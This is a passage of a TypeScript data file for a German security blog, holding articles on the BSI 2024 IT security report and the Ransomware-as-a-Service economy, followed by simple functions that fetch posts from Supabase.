    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: BSI Lagebericht 2024, bsi.bund.de',
    publishedAt: '2024-11-20',
    readTime: 10,
    imageGradient: 'linear-gradient(135deg, #001220 0%, #001A30 50%, #001220 100%)',
    badge: 'OFFIZIELL',
    badgeColor: '#00F0FF',
    tags: ['BSI', 'Lagebericht', 'Deutschland', 'Ransomware', 'KRITIS', 'Cybersecurity', 'KI-Angriffe'],
    sources: [
      { title: 'BSI: Die Lage der IT-Sicherheit in Deutschland 2024', url: 'https://www.bsi.bund.de/lageberichte' },
      { title: 'BSI Presse: Lagebericht 2024', url: 'https://www.bsi.bund.de/DE/Service-Navi/Presse/Pressemitteilungen/Presse2024/241107_Lagebericht.html' },
      { title: 'BSI: KRITIS-Schutz', url: 'https://www.bsi.bund.de/KRITIS' },
    ],
    faqs: [
      { q: 'Wo finde ich den vollständigen BSI Lagebericht?', a: 'Der vollständige BSI Lagebericht 2024 „Die Lage der IT-Sicherheit in Deutschland 2024" ist kostenlos als PDF auf bsi.bund.de/lageberichte herunterladbar. Das BSI veröffentlicht den Lagebericht jährlich im Oktober/November.' },
      { q: 'Was bedeutet die Bewertung „angespannt bis kritisch"?', a: 'Das BSI nutzt eine vierstufige Skala: normal, angespannt, kritisch, sehr kritisch. „Angespannt bis kritisch" bedeutet dass die Bedrohungslage seit mehreren Jahren anhält und sich in bestimmten Bereichen (KRITIS, Kommunen, Gesundheit) verschärft hat. Es ist keine Entwarnung, aber auch kein Ausnahmezustand.' },
      { q: 'Welche Branchen sind laut BSI besonders gefährdet?', a: 'Laut BSI sind besonders gefährdet: Kommunen und öffentliche Verwaltung (häufig unzureichend abgesichert), Gesundheitssektor (Krankenhäuser), Bildungseinrichtungen, und mittelständische Unternehmen als Teil von Lieferketten größerer Unternehmen.' },
    ],
    content: `<h2 id="ueberblick">BSI Lagebericht 2024: Kernaussagen</h2>
<p>Das Bundesamt für Sicherheit in der Informationstechnik (BSI) ist die zentrale Behörde für Cybersicherheit in Deutschland und veröffentlicht seit 2005 jährlich einen Lagebericht zur IT-Sicherheit. Der <strong>Lagebericht 2024 „Die Lage der IT-Sicherheit in Deutschland 2024"</strong> wurde im November 2024 veröffentlicht.</p>
<p>Die Gesamtbewertung des BSI lautet: Die IT-Sicherheitslage in Deutschland ist weiterhin <strong>angespannt bis kritisch</strong>. Dieser Befund hält sich nun mehrere Jahre in Folge. Das BSI warnt ausdrücklich davor, die anhaltende Lage zu normalisieren.</p>
<blockquote><p>„Die Bedrohungslage im Cyber-Raum ist weiterhin angespannt bis kritisch. Angriffe werden ausgefeilter, die Zahl der Angriffsmöglichkeiten wächst und die potenziellen Schäden steigen."</p><cite>— BSI Lagebericht 2024, Zusammenfassung</cite></blockquote>

<h2 id="hauptbedrohungen">Hauptbedrohungen laut BSI 2024</h2>
<h3 id="ransomware">1. Ransomware — Weiterhin größte Bedrohung</h3>
<p>Ransomware bleibt laut BSI die größte Einzelbedrohung für deutsche Unternehmen, Behörden und kritische Infrastruktur. Besonders alarmierend: Die Angriffe werden gezielter und professioneller. Ransomware-as-a-Service (RaaS) ermöglicht es auch technisch weniger versierten Kriminellen, komplexe Angriffe durchzuführen.</p>
<p>Besonders betroffen sind laut BSI:</p>
<ul>
<li><strong>Kommunen und Landkreise:</strong> Mehrere deutsche Kommunen wurden 2024 durch Ransomware weitgehend handlungsunfähig gemacht</li>
<li><strong>Krankenhäuser und Gesundheitseinrichtungen:</strong> Angriffe auf Gesundheitsinfrastruktur gefährden direkt Menschenleben</li>
<li><strong>Mittelständische Unternehmen (KMU):</strong> Oft schlechter abgesichert als Großunternehmen, aber Teil kritischer Lieferketten</li>
</ul>

<h3 id="ki-angriffe">2. KI-gestützte Angriffe — Neue Qualität der Bedrohung</h3>
<p>Der BSI Lagebericht 2024 widmet KI-gestützten Angriffen erstmals ein eigenständiges Kapitel. Generative KI senkt die Einstiegshürde für Cyberkriminelle erheblich:</p>
<ul>
<li><strong>KI-generiertes Phishing:</strong> Täuschend echte, personalisierte E-Mails in perfektem Deutsch — automatisiert und massenweise</li>
<li><strong>Deepfake-Betrug:</strong> Gefälschte Audio- und Videoaufnahmen von Führungskräften für CEO-Fraud-Angriffe</li>
<li><strong>Automatisierte Schwachstellensuche:</strong> KI-Tools finden und exploiten Sicherheitslücken schneller als bisher möglich</li>
<li><strong>Malware-Generierung:</strong> Large Language Models können bei der Erstellung von Schadsoftware assistieren</li>
</ul>

<h3 id="ddos">3. DDoS-Angriffe — Hacktivismus und staatliche Akteure</h3>
<p>DDoS-Angriffe auf deutsche Infrastruktur haben laut BSI zugenommen, besonders durch hacktivistische Gruppen im Kontext des russischen Angriffskrieges auf die Ukraine. Betroffen sind:</p>
<ul>
<li>Bundesbehörden und parlamentarische Institutionen</li>
<li>Flughäfen und Verkehrsinfrastruktur</li>
<li>Finanzinstitute</li>
<li>Medienhäuser und Nachrichtenportale</li>
</ul>

<h3 id="lieferkette">4. Supply-Chain-Angriffe — Angriffe über Dritte</h3>
<p>Angreifer kompromittieren zunehmend Zulieferer und Dienstleister, um über diese vertrauenswürdige Verbindungen in größere Zielorganisationen einzudringen. Der MOVEit-Angriff 2023 ist das prominenteste internationale Beispiel. Das BSI empfiehlt systematisches Third-Party Risk Management.</p>

<h2 id="kritis">KRITIS: Kritische Infrastruktur unter besonderer Beobachtung</h2>
<p>Das BSI betreibt das KRITIS-Programm zum Schutz kritischer Infrastrukturen. Als KRITIS gelten in Deutschland neun Sektoren: Energie, Wasser, Ernährung, Informationstechnik und Telekommunikation, Gesundheit, Finanz- und Versicherungswesen, Transport und Verkehr, Medien und Kultur, sowie Staat und Verwaltung.</p>
<p>Das BSI hat mit dem <strong>KRITIS-Dachgesetz</strong> (in Umsetzung der NIS-2-Richtlinie) und dem <strong>IT-Sicherheitsgesetz 2.0</strong> die Anforderungen an KRITIS-Betreiber verschärft. Betreiber kritischer Infrastrukturen sind verpflichtet:</p>
<ul>
<li>Erhebliche Cyberangriffe innerhalb von 24 Stunden an das BSI zu melden</li>
<li>Mindeststandards für IT-Sicherheit umzusetzen und nachzuweisen</li>
<li>Systeme zur Angriffserkennung (SzA) einzusetzen</li>
</ul>

<h2 id="nis2">NIS-2-Richtlinie: Erweiterte Meldepflichten für mehr Unternehmen</h2>
<p>Die EU-Richtlinie NIS-2 (Network and Information Security 2) hätte bis Oktober 2024 in deutsches Recht umgesetzt werden sollen. Das entsprechende <strong>NIS-2-Umsetzungsgesetz (NIS2UmsuCG)</strong> befindet sich im deutschen Gesetzgebungsverfahren und wird voraussichtlich 2025 in Kraft treten.</p>
<p>NIS-2 weitet den Kreis betroffener Unternehmen erheblich aus: Wo bisher ca. 2.000 KRITIS-Unternehmen reguliert wurden, werden es mit NIS-2 schätzungsweise <strong>29.000 Unternehmen</strong> in Deutschland sein.</p>
<p>Neue Anforderungen unter NIS-2:</p>
<ul>
<li>Risikomanagementmaßnahmen für Cybersicherheit</li>
<li>Meldepflicht bei Sicherheitsvorfällen (24h Erstmeldung, 72h Detailmeldung, 1 Monat Abschlussbericht)</li>
<li>Persönliche Haftung von Geschäftsführern bei Verstößen</li>
<li>Lieferketten-Sicherheitsanforderungen</li>
</ul>

<h2 id="empfehlungen">BSI-Empfehlungen für Unternehmen</h2>
<p>Das BSI gibt im Lagebericht 2024 folgende Kernempfehlungen:</p>
<ol>
<li><strong>IT-Grundschutz umsetzen:</strong> Das BSI IT-Grundschutz-Kompendium bietet einen vollständigen Rahmen für Sicherheitsmaßnahmen — kostenlos unter bsi.bund.de</li>
<li><strong>Backup-Strategie nach 3-2-1-1-0-Regel:</strong> 3 Kopien, 2 Medientypen, 1 Off-Site, 1 Offline (Air-Gap), 0 ungetestete Backups</li>
<li><strong>Multi-Faktor-Authentifizierung (MFA) überall:</strong> Insbesondere für E-Mail, VPN, Admin-Zugänge und Cloud-Dienste</li>
<li><strong>Patch-Management beschleunigen:</strong> Kritische Schwachstellen (CVSS ≥ 9) innerhalb von 24 Stunden patchen</li>
<li><strong>Mitarbeiterschulungen:</strong> Regelmäßige Security-Awareness-Trainings mit simulierten Phishing-Tests</li>
<li><strong>Incident Response Plan:</strong> Schriftlichen Plan für Sicherheitsvorfälle haben und regelmäßig üben</li>
</ol>`,
  },

  // ── 5. Ransomware-as-a-Service ───────────────────────────────────────────────
  {
    id: '5',
    slug: 'ransomware-as-a-service-2024',
    title: 'Ransomware-as-a-Service 2024: Wie die Industrie des digitalen Erpressens funktioniert',
    excerpt: 'Ransomware ist zur industrialisierten Kriminalität geworden. Laut Sophos State of Ransomware 2024 waren 59% der befragten Organisationen betroffen. Eine Analyse der RaaS-Ökonomie, aktueller Gruppen und wirksamer Gegenmaßnahmen.',
    category: 'Analyse',
    categoryColor: '#9664FF',
    categoryBg: 'rgba(150,100,255,0.1)',
    author: 'sicherheit.ai Redaktion',
    authorRole: 'Basierend auf: Sophos, IBM, Veeam, Europol, BSI',
    publishedAt: '2024-09-01',
    readTime: 13,
    imageGradient: 'linear-gradient(135deg, #0D0820 0%, #150A30 50%, #0D0820 100%)',
    badge: 'ANALYSE',
    badgeColor: '#9664FF',
    tags: ['Ransomware', 'RaaS', 'Extortion', 'Cl0p', 'LockBit', 'ALPHV', 'Incident Response', 'Backup'],
    sources: [
      { title: 'Sophos State of Ransomware 2024', url: 'https://www.sophos.com/en-us/content/state-of-ransomware' },
      { title: 'IBM Cost of a Data Breach Report 2024', url: 'https://www.ibm.com/reports/data-breach' },
      { title: 'Veeam Ransomware Trends Report 2024', url: 'https://www.veeam.com/ransomware-trends-report-2024.html' },
      { title: 'Europol IOCTA 2024', url: 'https://www.europol.europa.eu/publications-events/main-reports/iocta-report' },
      { title: 'BSI: Ransomware', url: 'https://www.bsi.bund.de/ransomware' },
    ],
    faqs: [
      { q: 'Soll man Lösegeld zahlen?', a: 'Das BSI und alle Strafverfolgungsbehörden raten ausdrücklich von Lösegeldzahlungen ab. Gründe: 1) Keine Garantie auf Entschlüsselung oder Datenlöschung. 2) Laut Sophos 2024: 56% der zahlenden Organisationen konnten nicht alle Daten wiederherstellen. 3) Lösegeldzahlungen finanzieren weitere Angriffe. 4) Rechtliche Risiken (Sanktionen wenn Angreifer auf Sanktionslisten stehen).' },
      { q: 'Was sind die wichtigsten ersten Schritte nach einem Ransomware-Angriff?', a: '1) Betroffene Systeme sofort vom Netzwerk isolieren (nicht ausschalten — forensische Beweise erhalten). 2) IT-Notfallteam/externen Incident-Response-Dienstleister alarmieren. 3) BSI informieren (Pflicht für KRITIS-Betreiber, empfohlen für alle). 4) Staatsanwaltschaft/LKA benachrichtigen. 5) Datenschutzbehörde informieren wenn personenbezogene Daten betroffen (72-Stunden-Frist DSGVO). 6) Backup-Integrität prüfen.' },
      { q: 'Kann man Ransomware ohne Backup wiederherstellen?', a: 'In manchen Fällen ja: Das Projekt NoMoreRansom (nomoreransom.org) — eine Initiative von Europol, FBI, und Antivirusherstellern — bietet kostenlose Entschlüsselungstools für bekannte Ransomware-Familien. Allerdings haben aktuelle RaaS-Gruppen in der Regel keine bekannten Schwächen in der Verschlüsselung.' },
      { q: 'Was kostet ein Ransomware-Angriff wirklich?', a: 'Laut IBM Cost of a Data Breach 2024: durchschnittlich 4,88 Millionen USD Gesamtkosten (global). Darin enthalten sind Lösegeldzahlungen, Wiederherstellungskosten, Betriebsunterbrechung, Reputationsschäden und rechtliche Kosten. Laut Sophos 2024: Durchschnittliche Wiederherstellungskosten 2,73 Millionen USD — unabhängig davon ob Lösegeld gezahlt wurde.' },
    ],
    content: `<h2 id="was-ist-raas">Was ist Ransomware-as-a-Service?</h2>
<p>Ransomware-as-a-Service (RaaS) ist ein Geschäftsmodell, bei dem Ransomware-Entwickler ihre Schadsoftware und Infrastruktur als Dienstleistung an Kriminelle vermieten — die sogenannten <strong>Affiliates</strong>. Der Affiliate führt den Angriff durch und teilt den Erlös mit den RaaS-Entwicklern, typischerweise 20–30%.</p>
<p>Dieses Modell hat Ransomware industrialisiert: Technisches Know-how ist nicht mehr notwendig. Ein Affiliate kauft Zugangsdaten (Credentials) zu Firmennetzwerken auf kriminellen Marktplätzen, lässt die RaaS-Plattform die Verschlüsselung durchführen und wartet auf Lösegeldzahlungen.</p>

<h2 id="zahlen">Zahlen und Fakten 2024</h2>
<p>Folgende Zahlen entstammen veröffentlichten Berichten seriöser Quellen:</p>
<ul>
<li><strong>Sophos State of Ransomware 2024</strong> (5.000 befragte IT-Entscheider in 14 Ländern): <strong>59% der Organisationen</strong> wurden in den letzten 12 Monaten von Ransomware getroffen</li>
<li><strong>Sophos 2024:</strong> Durchschnittliche Lösegeldforderung: <strong>2 Millionen USD</strong> (Median)</li>
<li><strong>Sophos 2024:</strong> Nur <strong>44% der zahlenden Organisationen</strong> zahlten weniger als die ursprüngliche Forderung (nach Verhandlung)</li>
<li><strong>IBM Cost of a Data Breach 2024:</strong> Durchschnittliche Gesamtkosten eines Datenvorfalls: <strong>4,88 Millionen USD</strong> (globaler Durchschnitt, höchster Wert seit Beginn der Erhebung)</li>
<li><strong>Veeam Ransomware Trends 2024:</strong> <strong>75% der Unternehmen</strong> waren 2023/24 Opfer von mindestens einem Ransomware-Angriff</li>
</ul>

<h2 id="gruppen">Aktive RaaS-Gruppen 2024</h2>
<h3 id="lockbit">LockBit 3.0</h3>
<p>LockBit war bis Anfang 2024 die produktivste Ransomware-Gruppe weltweit. Im Februar 2024 führte <strong>Operation Cronos</strong> — eine koordinierte Aktion von Europol, FBI, NCA (Großbritannien) und 10 weiteren Behörden — zur Abschaltung der LockBit-Infrastruktur und Verhaftung mehrerer Mitglieder. Zwei mutmaßliche LockBit-Affiliates wurden in Polen und der Ukraine festgenommen, ein russisches Mitglied wurde in den USA angeklagt.</p>
<p>LockBit versuchte sich neu zu formieren, verlor aber erheblich an Kapazität und Reputation in der kriminellen Gemeinschaft.</p>

<h3 id="alphv">ALPHV/BlackCat</h3>
<p>ALPHV (auch BlackCat) war 2023/24 eine der technisch fortschrittlichsten Ransomware-Gruppen. Im März 2024 übernahm das FBI die ALPHV-Leak-Seite. Kurz darauf führte ALPHV angeblich einen <strong>Exit Scam</strong> durch — verschwand mit ca. 22 Millionen USD Lösegeld, das ein Affiliate für den Angriff auf Change Healthcare (US-Gesundheitsversorgung) erpresst hatte.</p>
<p>Der Angriff auf Change Healthcare im Februar 2024 verursachte massive Störungen im US-amerikanischen Gesundheitssystem und gilt als einer der folgenschwersten Ransomware-Vorfälle in der Geschichte.</p>

<h3 id="cl0p">Cl0p</h3>
<p>Cl0p ist bekannt für groß angelegte Angriffe auf Dateitransfer-Software (Accellion 2021, GoAnywhere 2023, MOVEit 2023). Die Gruppe setzt auf Datendiebstahl ohne Verschlüsselung — ein Trend der sich 2024 fortsetzt.</p>

<h2 id="anatomie">Anatomie eines modernen Ransomware-Angriffs</h2>
<p>Moderne RaaS-Angriffe folgen typischerweise einer strukturierten Angriffskette:</p>
<ol>
<li><strong>Initial Access:</strong> Phishing-E-Mails, kompromittierte VPN-Zugangsdaten (z.B. aus Datenpannen), öffentlich zugängliche Schwachstellen in RDP, VPN-Appliances</li>
<li><strong>Persistence:</strong> Installation von Remote-Access-Tools (Cobalt Strike, Metasploit), Erstellung von Backdoor-Accounts</li>
<li><strong>Lateral Movement:</strong> Ausbreitung im Netzwerk über Pass-the-Hash, RDP, WMI — Ziel sind Active-Directory-Admins und Backup-Systeme</li>
<li><strong>Data Exfiltration (Double Extortion):</strong> Systematischer Datendiebstahl vor der Verschlüsselung als Druckmittel</li>
<li><strong>Backup-Sabotage:</strong> Löschen oder Verschlüsseln von Backup-Systemen — kritischste Phase für die Wiederherstellbarkeit</li>
<li><strong>Deployment:</strong> Gleichzeitige Ausführung des Ransomware-Payloads auf allen identifizierten Systemen</li>
</ol>
<pre><code class="language-bash"># Typische Verweildauer vor Verschlüsselung (laut Mandiant M-Trends 2024):
# Medianer "Dwell Time": 10 Tage (globaler Durchschnitt)
# D.h.: Angreifer sind im Schnitt 10 Tage im Netzwerk BEVOR der Angriff sichtbar wird
# Ziel: Backup-Systeme identifizieren und kompromittieren</code></pre>

<h2 id="schutz">Wirkungsvolle Schutzmaßnahmen</h2>
<p>Folgende Maßnahmen sind laut BSI, CISA und führenden Sicherheitsforschern am wirksamsten:</p>
<h3 id="backup">Backup nach 3-2-1-1-0</h3>
<ul>
<li><strong>3</strong> Kopien der Daten</li>
<li><strong>2</strong> verschiedene Speichermedien</li>
<li><strong>1</strong> Off-Site Kopie</li>
<li><strong>1</strong> Offline / Air-Gapped Kopie (nicht erreichbar über das Netzwerk)</li>
<li><strong>0</strong> ungetestete Backups — regelmäßige Restore-Tests sind Pflicht</li>
</ul>
<h3 id="mfa-privilegien">MFA + Privilegienverwaltung</h3>
<ul>
<li>MFA für alle externen Zugänge (VPN, E-Mail, RDP, Admin-Interfaces)</li>
<li>Privileged Access Management (PAM) für Admin-Accounts</li>
<li>Least-Privilege-Prinzip: Jeder Account hat nur die minimal notwendigen Rechte</li>
</ul>
<h3 id="segmentierung">Netzwerksegmentierung</h3>
<ul>
<li>Backup-Systeme in eigenem, isolierten VLAN ohne direkte Verbindung zu Produktionssystemen</li>
<li>Micro-Segmentierung verhindert laterale Bewegung</li>
<li>Zero-Trust-Architektur: Kein implizites Vertrauen innerhalb des Netzwerks</li>
</ul>

<h2 id="strafverfolgung">Strafverfolgung: Erfolge und Grenzen</h2>
<p>Die internationale Strafverfolgung hat 2024 Fortschritte erzielt:</p>
<ul>
<li><strong>Operation Cronos (Februar 2024):</strong> Zerschlagung von LockBit, Verhaftung mehrerer Mitglieder</li>
<li><strong>ALPHV-Disruption (Dezember 2023/März 2024):</strong> FBI übernimmt ALPHV-Infrastruktur</li>
<li><strong>Hive-Ransomware (Januar 2023):</strong> FBI infiltrierte Hive für 6 Monate und stellte Entschlüsselungskeys bereit</li>
</ul>
<p>Trotz dieser Erfolge: Die meisten RaaS-Entwickler operieren aus Ländern ohne Auslieferungsabkommen (Russland, Iran, Nordkorea) und sind damit praktisch unantastbar für westliche Strafverfolgungsbehörden.</p>`,
  },
];

// ─── Data access functions ───────────────────────────────────────────────────

export async function getPosts(): Promise<Post[]> {
  if (supabase) {
    const { data } = await supabase
      .from('posts')
      .select('*')
      .order('published_at', { ascending: false });
    if (data?.length) return data as Post[];
  }
  return STATIC_POSTS;
}

export async function getPost(slug: string): Promise<Post | null> {
  if (supabase) {
    const { data } = await supabase
      .from('posts')
      .select('*')
      .eq('slug', slug)
      .single();
    if (data) return data as Post;
  }
  return STATIC_POSTS.find(p => p.slug === slug) ?? null;
}

export async function getRelatedPosts(slug: string, category: string): Promise<Post[]> {
  const all = await getPosts();
  return all.filter(p => p.slug !== slug && p.category === category).slice(0, 3);
}

export function formatDate(dateStr: string): string {
  return new Date(dateStr).toLocaleDateString('de-DE', {
    day: '2-digit', month: 'long', year: 'numeric',
  });
}
